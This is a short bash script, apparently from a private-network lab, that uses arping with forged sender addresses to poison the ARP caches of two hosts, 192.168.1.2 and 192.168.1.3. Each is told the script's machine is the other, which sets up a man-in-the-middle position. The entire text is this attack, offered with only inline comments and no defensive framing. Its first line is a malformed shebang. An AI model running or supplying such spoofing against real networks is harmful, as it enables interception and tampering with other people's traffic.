#/bin/bash
arping -s 192.168.1.3 -I enp0s8 -c 1 192.168.1.2 # tell 192.168.1.2 that we are 192.168.1.3
arping -s 192.168.1.2 -I enp0s8 -c 1 192.168.1.3 # tell 192.168.1.3 that we are 192.168.1.2
